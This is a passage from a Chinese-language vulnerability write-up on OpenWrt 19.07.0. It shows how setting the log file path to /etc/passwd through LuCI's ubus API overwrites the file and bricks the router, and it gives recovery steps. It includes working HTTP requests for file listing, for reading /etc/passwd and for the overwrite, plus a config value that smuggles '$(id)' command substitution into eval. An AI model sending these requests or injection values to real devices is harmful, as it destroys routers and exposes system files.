<span class="string">&#x27;0&#x27;</span></span><br><span class="line">trueoption zonename <span class="string">&#x27;UTC&#x27;</span></span><br><span class="line">trueoption log_size <span class="string">&#x27;1&#x27;</span></span><br><span class="line">trueoption cronloglevel <span class="string">&#x27;5&#x27;</span></span><br><span class="line">trueoption log_proto <span class="string">&#x27;udp&#x27;</span></span><br><span class="line">trueoption log_file <span class="string">&#x27;/etc/passwd&#x27;</span></span><br><span class="line">trueoption conloglevel <span class="string">&#x27;8&#x27;</span></span><br><span class="line"></span><br><span class="line">config timeserver <span class="string">&#x27;ntp&#x27;</span></span><br><span class="line">truelist server <span class="string">&#x27;0.openwrt.pool.ntp.org&#x27;</span></span><br><span class="line">truelist server <span class="string">&#x27;1.openwrt.pool.ntp.org&#x27;</span></span><br><span class="line">truelist server <span class="string">&#x27;2.openwrt.pool.ntp.org&#x27;</span></span><br><span class="line">truelist server <span class="string">&#x27;3.openwrt.pool.ntp.org&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="2-后台处理流程"><a href="#2-后台处理流程" class="headerlink" title="2. 后台处理流程"></a>2. 后台处理流程</h4><p><code>/etc/init.d/log</code>从 <code>/etc/congfig/system</code>读取出参数,并调用 logread实现日志获取和保存。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 省略部分</span></span><br><span class="line">PROG=/sbin/logread   </span><br><span class="line">start_service_file()                                                              </span><br><span class="line">&#123;                                                                                 </span><br><span class="line">        PIDCOUNT=<span class="string">&quot;<span class="subst">$(( $&#123;PIDCOUNT&#125; + 1)</span>)&quot;</span>                                          </span><br><span class="line">        <span class="built_in">local</span> pid_file=<span class="string">&quot;/var/run/logread.<span class="variable">$&#123;PIDCOUNT&#125;</span>.pid&quot;</span>                         </span><br><span class="line">                                                                                  </span><br><span class="line">        [ <span class="string">&quot;<span class="variable">$2</span>&quot;</span> = 0 ] || &#123;                                                         </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;validation failed&quot;</span>                                          </span><br><span class="line">                <span class="built_in">return</span> 1                                                          </span><br><span class="line">        &#125;                                                                         </span><br><span class="line">        [ -z <span class="string">&quot;<span class="variable">$&#123;log_file&#125;</span>&quot;</span> ] &amp;&amp; <span class="built_in">return</span>                                            </span><br><span class="line">                                                                                  </span><br><span class="line">        mkdir -p <span class="string">&quot;<span class="subst">$(dirname <span class="string">&quot;<span class="variable">$&#123;log_file&#125;</span>&quot;</span>)</span>&quot;</span>                                       </span><br><span class="line">                                                                                  </span><br><span class="line">        procd_open_instance                                                       </span><br><span class="line">        procd_set_param <span class="built_in">command</span> <span class="string">&quot;<span class="variable">$PROG</span>&quot;</span> -f -F <span class="string">&quot;<span class="variable">$log_file</span>&quot;</span> -p <span class="string">&quot;<span class="variable">$pid_file</span>&quot;</span>          </span><br><span class="line">        [ -n <span class="string">&quot;<span class="variable">$&#123;log_size&#125;</span>&quot;</span> ] &amp;&amp; procd_append_param <span class="built_in">command</span> -S <span class="string">&quot;<span class="variable">$log_size</span>&quot;</span>         </span><br><span class="line">        procd_close_instance                                                      </span><br><span class="line">&#125;     </span><br><span class="line"></span><br><span class="line">start_service()                                                                             </span><br><span class="line">&#123;                                                                                           </span><br><span class="line">        config_load system                                                                 </span><br><span class="line">        config_foreach validate_log_daemon system start_service_daemon                     </span><br><span class="line">        config_foreach validate_log_section system start_service_file                       </span><br><span class="line">        config_foreach validate_log_section system start_service_remote                     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>首先使用<a target="_blank" rel="noopener" href="https://github.com/openwrt/openwrt/blob/2c60de0e3f8cbe088fe8e495697cb9e98380710d/package/base-files/files/lib/functions.sh#L53"><code>config_load</code></a>中调用<a target="_blank" rel="noopener" href="https://github.com/openwrt/openwrt/blob/35ba9304c60665724803ae142ba971947973012c/package/system/uci/files/lib/config/uci.sh#L22"><code>uci_load</code></a> /etc/config/system` 把参数读取到环境变量中。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_APPEND=</span><br><span class="line"><span class="function"><span class="title">uci_load</span></span>() &#123;</span><br><span class="line">true<span class="built_in">local</span> PACKAGE=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">true<span class="built_in">local</span> DATA</span><br><span class="line">true<span class="built_in">local</span> RET</span><br><span class="line">true<span class="built_in">local</span> VAR</span><br><span class="line"></span><br><span class="line">true_C=0</span><br><span class="line">true<span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$CONFIG_APPEND</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">truetrue<span class="keyword">for</span> VAR <span class="keyword">in</span> <span class="variable">$CONFIG_LIST_STATE</span>; <span class="keyword">do</span></span><br><span class="line">truetruetrue<span class="built_in">export</span> <span class="variable">$&#123;NO_EXPORT:+-n&#125;</span> CONFIG_<span class="variable">$&#123;VAR&#125;</span>=</span><br><span class="line">truetruetrue<span class="built_in">export</span> <span class="variable">$&#123;NO_EXPORT:+-n&#125;</span> CONFIG_<span class="variable">$&#123;VAR&#125;</span>_LENGTH=</span><br><span class="line">truetrue<span class="keyword">done</span></span><br><span class="line">truetrue<span class="built_in">export</span> <span class="variable">$&#123;NO_EXPORT:+-n&#125;</span> CONFIG_LIST_STATE=</span><br><span class="line">truetrue<span class="built_in">export</span> <span class="variable">$&#123;NO_EXPORT:+-n&#125;</span> CONFIG_SECTIONS=</span><br><span class="line">truetrue<span class="built_in">export</span> <span class="variable">$&#123;NO_EXPORT:+-n&#125;</span> CONFIG_NUM_SECTIONS=0</span><br><span class="line">truetrue<span class="built_in">export</span> <span class="variable">$&#123;NO_EXPORT:+-n&#125;</span> CONFIG_SECTION=</span><br><span class="line">true<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">trueDATA=<span class="string">&quot;<span class="subst">$(/sbin/uci $&#123;UCI_CONFIG_DIR:+-c $UCI_CONFIG_DIR&#125; $&#123;LOAD_STATE:+-P /var/state&#125; -S -n export <span class="string">&quot;<span class="variable">$PACKAGE</span>&quot;</span> 2&gt;/dev/null)</span>&quot;</span></span><br><span class="line">trueRET=<span class="string">&quot;$?&quot;</span></span><br><span class="line">true[ <span class="string">&quot;<span class="variable">$RET</span>&quot;</span> != 0 -o -z <span class="string">&quot;<span class="variable">$DATA</span>&quot;</span> ] || <span class="built_in">eval</span> <span class="string">&quot;<span class="variable">$DATA</span>&quot;</span></span><br><span class="line">true<span class="built_in">unset</span> DATA</span><br><span class="line"></span><br><span class="line">true<span class="variable">$&#123;CONFIG_SECTION:+config_cb</span></span><br><span class="line"><span class="variable">	return &quot;$RET&quot;</span></span><br><span class="line"><span class="variable">&#125;</span></span><br></pre></td></tr></table></figure>
<p>然后 <a target="_blank" rel="noopener" href="https://github.com/openwrt/openwrt/blob/fd28ef59db92da245debf207892fad8e1a0d9e45/package/system/ubox/files/log.init#L44"><code>start_service_file</code></a> 函数调用 <code>procd_set_param command &quot;$PROG&quot; -f -F &quot;$log_file&quot; -p &quot;$pid_file&quot;</code>从环境变量中拿到参数后，执行 logread 命令，实现日志获取和保存。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@OpenWrt:~<span class="comment"># ps |grep logread</span></span><br><span class="line"> 5107 root       948 S    /sbin/logread -f -F /etc/passwd -p /var/run/logread.1.pid -S 1</span><br></pre></td></tr></table></figure>
<h4 id="3-文件被覆盖，OpenWrt拒绝服务"><a href="#3-文件被覆盖，OpenWrt拒绝服务" class="headerlink" title="3. 文件被覆盖，OpenWrt拒绝服务"></a>3. 文件被覆盖，OpenWrt拒绝服务</h4><p>最初日志会附加在 <code>/etc/passwd</code>中，刚开始不会影响系统的正常运行，但当日志的大小超过<code>/etc/config/system</code>中的<code>log_size</code>的值时，之前的内容会被覆盖。</p>
<p>等待一段时间（延迟触发），或直接重启（立即触发）后，可以看到 passwd 被覆盖，超出 1K 之前的日志被放在了 passwd.old 中。OpenWrt 拒绝服务，WEB 后台、SSH 无法正常使用。如果这是一个真实的路由器，现在它已经“变砖”了。</p>
<p><img src="image-20200112123744064.png" alt="passwd 被覆盖"></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>OpenWrt 版本：OpenWrt 19.07.0 </p>
<p>测试平台：x86 VMware</p>
<h4 id="1-设置日志大小和路径"><a href="#1-设置日志大小和路径" class="headerlink" title="1.设置日志大小和路径"></a>1.设置日志大小和路径</h4><p> 修改系统日志的大小和存储：在 logging 页面把 “System log buffer size” 设置 1 KB，把 “Write system log to file” 设置为 /etc/passwd/。</p>
<p><img src="image-20200110233312316.png" alt="设置日志参数"></p>
<h4 id="2-生成-1K-以上的日志，覆盖-etc-passwd"><a href="#2-生成-1K-以上的日志，覆盖-etc-passwd" class="headerlink" title="2. 生成 1K 以上的日志，覆盖 /etc/passwd"></a>2. 生成 1K 以上的日志，覆盖 /etc/passwd</h4><p>为了产生日志，最快的方法是重启OpenWrt。或等待一段时间，等待系统自动生成日志（延时触发）。</p>
<p><img src="image-20200110233335232.png" alt="重启路由"></p>
<h4 id="3-OpenWrt-拒绝服务效果"><a href="#3-OpenWrt-拒绝服务效果" class="headerlink" title="3.OpenWrt 拒绝服务效果"></a>3.OpenWrt 拒绝服务效果</h4><p>1) Web 管理页面绝服务。</p>
<p><img src="image-20200110233616372.png" alt="WEB DOS"></p>
<p>2）通过”串口”进入路由器，发现 /etc/passwd 被重写，网络也断开了。</p>
<p><img src="image-20200110234205411.png" alt="DOS 效果"></p>
<p>3) 由于 passwd 文件被覆盖，SSH 无法认证用户，故无法使用。如果是真实的路由器，这个路由器就变砖了。</p>
<p><img src="image-20200112012743093.png" alt="SSH 登录失败"></p>
<h4 id="4-演示视频"><a href="#4-演示视频" class="headerlink" title="4.演示视频"></a>4.演示视频</h4><p><video src="./任意文件覆盖_POC.mp4"></video></p>
<h3 id="救砖"><a href="#救砖" class="headerlink" title="救砖"></a>救砖</h3><p>进测试了 X86 平台，其他平台可按照实际调整。</p>
<p>通过串口进入 OpenWrt，默认无身份验证，能进入 shell。只需要两步就能恢复。</p>
<p>（1）使用 passwd- 还原 passwd</p>
<p>（2）将 /etc/config/system 中的 log_file 置空，或改为其他无关的路径。</p>
<p><img src="image-20200112130533976.png" alt="救砖"></p>
<p>如果存在授权认证，通过串口不能进入交互式 Shell，就只能通过 uboot 重新刷写了。</p>
<h2 id="有意思的内容"><a href="#有意思的内容" class="headerlink" title="有意思的内容"></a>有意思的内容</h2><h3 id="系统文件目录列举"><a href="#系统文件目录列举" class="headerlink" title="系统文件目录列举"></a>系统文件目录列举</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cgi-bin/luci/admin/ubus</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.7.143</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.7.143/cgi-bin/luci/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>119</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.7.143</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">[&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:2,&quot;method&quot;:&quot;call&quot;,&quot;params&quot;:[&quot;9e3e02d9aad24fbfba163537d17d9b83&quot;,&quot;file&quot;,&quot;list&quot;,&#123;&quot;path&quot;:&quot;/www/&quot;&#125;]&#125;]</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Expires</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">X-XSS-Protection</span><span class="punctuation">: </span>1; mode=block</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span><span class="punctuation">: </span>nosniff</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>501</span><br><span class="line"></span><br><span class="line">[&#123;&quot;id&quot;:2,&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;result&quot;:[0,&#123;&quot;entries&quot;:[&#123;&quot;type&quot;:&quot;directory&quot;,&quot;inode&quot;:1179,&quot;ctime&quot;:1575129153,&quot;atime&quot;:1575129153,&quot;uid&quot;:0,&quot;mtime&quot;:1575129153,&quot;gid&quot;:0,&quot;mode&quot;:16877,&quot;name&quot;:&quot;cgi-bin&quot;,&quot;size&quot;:4096&#125;,&#123;&quot;type&quot;:&quot;file&quot;,&quot;inode&quot;:1184,&quot;ctime&quot;:1575129153,&quot;atime&quot;:1575129153,&quot;uid&quot;:0,&quot;mtime&quot;:1575129153,&quot;gid&quot;:0,&quot;mode&quot;:33188,&quot;name&quot;:&quot;index.html&quot;,&quot;size&quot;:524&#125;,&#123;&quot;type&quot;:&quot;directory&quot;,&quot;inode&quot;:1185,&quot;ctime&quot;:1575129153,&quot;atime&quot;:1575129153,&quot;uid&quot;:0,&quot;mtime&quot;:1575129153,&quot;gid&quot;:0,&quot;mode&quot;:16877,&quot;name&quot;:&quot;luci-static&quot;,&quot;size&quot;:4096&#125;]&#125;]&#125;]</span><br></pre></td></tr></table></figure>
<h3 id="任意文件覆盖"><a href="#任意文件覆盖" class="headerlink" title="任意文件覆盖"></a>任意文件覆盖</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://192.168.7.143/cgi-bin/luci/admin/ubus?1578741218608</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.7.143</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>192</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.7.143</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.7.143/cgi-bin/luci/admin/system/system</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sysauth=b1f9ac240ca8135e2c41a12cca5c5cb6</span><br><span class="line"></span><br><span class="line">[&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:37,&quot;method&quot;:&quot;call&quot;,&quot;params&quot;:[&quot;b1f9ac240ca8135e2c41a12cca5c5cb6&quot;,&quot;uci&quot;,&quot;set&quot;,&#123;&quot;config&quot;:&quot;system&quot;,&quot;section&quot;:&quot;cfg01e48a&quot;,&quot;values&quot;:&#123;&quot;log_size&quot;:&quot;1&quot;,&quot;log_file&quot;:&quot;/etc/passwd&quot;&#125;&#125;]&#125;]</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Expires</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">X-XSS-Protection</span><span class="punctuation">: </span>1; mode=block</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span><span class="punctuation">: </span>nosniff</span><br><span class="line"></span><br><span class="line">[&#123;&quot;id&quot;:40,&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;result&quot;:[0]&#125;]</span><br></pre></td></tr></table></figure>
<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p> /etc/shadow（文件权限400） 可能不是以root去读的，权限不够无法读取 。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cgi-bin/luci/admin/ubus?1578715003061</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.7.143</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.7.143/cgi-bin/luci/admin/system/flash</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>125</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.7.143</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sysauth=9e3e02d9aad24fbfba163537d17d9b83</span><br><span class="line"></span><br><span class="line">[&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:5,&quot;method&quot;:&quot;call&quot;,&quot;params&quot;:[&quot;9e3e02d9aad24fbfba163537d17d9b83&quot;,&quot;file&quot;,&quot;read&quot;,&#123;&quot;path&quot;:&quot;/etc/passwd&quot;&#125;]&#125;]</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Expires</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">X-XSS-Protection</span><span class="punctuation">: </span>1; mode=block</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span><span class="punctuation">: </span>nosniff</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>322</span><br><span class="line"></span><br><span class="line">[&#123;&quot;id&quot;:5,&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;result&quot;:[0,&#123;&quot;data&quot;:&quot;root:x:0:0:root:\/root:\/bin\/ash\ndaemon:*:1:1:daemon:\/var:\/bin\/false\nftp:*:55:55:ftp:\/home\/ftp:\/bin\/false\nnetwork:*:101:101:network:\/var:\/bin\/false\nnobody:*:65534:65534:nobody:\/var:\/bin\/false\ndnsmasq:x:453:453:dnsmasq:\/var\/run\/dnsmasq:\/bin\/false\n&quot;&#125;]&#125;]</span><br></pre></td></tr></table></figure>
<h3 id="奇怪-eavl"><a href="#奇怪-eavl" class="headerlink" title="奇怪 eavl"></a>奇怪 eavl</h3><p>在分析中，发现了一段有趣的代码。 </p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DATA=<span class="string">&quot;<span class="subst">$(/sbin/uci $&#123;UCI_CONFIG_DIR:+-c $UCI_CONFIG_DIR&#125; $&#123;LOAD_STATE:+-P /var/state</span></span></span><br><span class="line"><span class="string"><span class="subst">#DATA=<span class="string">&quot;<span class="subst">$(uci -P /var/state -S -n export system 2&gt;/dev/null)</span>&quot;</span></span></span></span><br><span class="line"><span class="string"><span class="subst">RET=<span class="string">&quot;$?&quot;</span>                                                                   </span></span></span><br><span class="line"><span class="string"><span class="subst">[ <span class="string">&quot;<span class="variable">$RET</span>&quot;</span> != 0 -o -z <span class="string">&quot;<span class="variable">$DATA</span>&quot;</span> ] || eval <span class="string">&quot;<span class="variable">$DATA</span>&quot;</span>                                      </span></span></span><br><span class="line"><span class="string"><span class="subst">unset DATA</span></span></span><br></pre></td></tr></table></figure>
<p>以<code>/etc/system/log</code>中设置日志为例，<code>config_load</code>函数会调用到<a target="_blank" rel="noopener" href="https://github.com/openwrt/openwrt/blob/395bef4bbacc0dd1cca72907529539194504be27/package/system/uci/files/lib/config/uci.sh#L22"><code>uci_load</code></a>函数，上面的这段代码就摘自 <code>uci_load</code>。$DATA 的值是<code>/etc/config/system</code>的文件内容。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@OpenWrt:/etc/init.d<span class="comment"># cat /etc/config/system</span></span><br><span class="line"></span><br><span class="line">config system</span><br><span class="line">trueoption hostname <span class="string">&#x27;OpenWrt&#x27;</span></span><br><span class="line">trueoption ttylogin <span class="string">&#x27;0&#x27;</span></span><br><span class="line">trueoption urandom_seed <span class="string">&#x27;0&#x27;</span></span><br><span class="line">trueoption zonename <span class="string">&#x27;UTC&#x27;</span></span><br><span class="line">trueoption log_size <span class="string">&#x27;64&#x27;</span></span><br><span class="line">trueoption cronloglevel <span class="string">&#x27;5&#x27;</span></span><br><span class="line">trueoption log_proto <span class="string">&#x27;udp&#x27;</span></span><br><span class="line">trueoption log_file <span class="string">&#x27;/etc/init.d/pwned$(id)&#x27;</span></span><br><span class="line">trueoption conloglevel <span class="string">&#x27;7&#x27;</span></span><br><span class="line"></span><br><span class="line">config timeserver <span class="string">&#x27;ntp&#x27;</span></span><br><span class="line">truelist server <span class="string">&#x27;0.openwrt.pool.ntp.org&#x27;</span></span><br><span class="line">truelist server <span class="string">&#x27;1.openwrt.pool.ntp.org&#x27;</span></span><br><span class="line">truelist server <span class="string">&#x27;2.openwrt.pool.ntp.org&#x27;</span></span><br><span class="line">truelist server <span class="string">&#x27;3.openwrt.pool.ntp.org&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://github.com/openwrt/openwrt/blob/395bef4bbacc0dd1cca72907529539194504be27/package/system/uci/files/lib/config/uci.sh#L42">eval “$DATA”</a> 能在当前环境能够运行，且会影响到环境变量。但是把这段代码单独拿出来就会报错。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@OpenWrt:/etc/init.d<span class="comment"># DATA=&quot;$(uci -P /var/state -S -n export system</span></span><br><span class="line"> 2&gt;/dev/null)<span class="string">&quot;</span></span><br><span class="line"><span class="string">root@OpenWrt:/etc/init.d# eval &quot;</span><span class="variable">$DATA</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">-ash: eval: package: not found</span></span><br><span class="line"><span class="string">-ash: eval: config: not found</span></span><br><span class="line"><span class="string">-ash: eval: option: not found</span></span><br><span class="line"><span class="string">-ash: eval: option: not found</span></span><br><span class="line"><span class="string">-ash: eval: option: not found</span></span><br><span class="line"><span class="string">-ash: eval: option: not found</span></span><br><span class="line"><span class="string">-ash: eval: option: not found</span></span><br><span class="line"><span class="string">-ash: eval: option: not found</span></span><br><span class="line"><span class="string">-ash: eval: option: not found</span></span><br><span class="line"><span class="string">-ash: eval: option: not found</span></span><br><span class="line"><span class="string">-ash: eval: option: not found</span></span><br><span class="line"><span class="string">-ash: eval: config: not found</span></span><br><span class="line"><span class="string">-ash: eval: list: not found</span></span><br><span class="line"><span class="string">-ash: eval: list: not found</span></span><br><span class="line"><span class="string">-ash: eval: list: not found</span></span><br><span class="line"><span class="string">-ash: eval: list: not found</span></span><br></pre></td></tr></table></figure>
<p>自己琢磨了很久，也查了不少资料。最后发现 eval 仍然是按行执行的，只是每一行的第一段是函数名，如<a target="_blank" rel="noopener" href="https://github.com/openwrt/openwrt/blob/2c60de0e3f8cbe088fe8e495697cb9e98380710d/package/base-files/files/lib/functions.sh#L69">config</a>函数。这些函数只有在特定环境下，再能被调用，否则无法识别。</p>
<h2 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h2><h3 id="config-load"><a href="#config-load" class="headerlink" title="config_load"></a>config_load</h3><p>/lib/functions.sh</p>
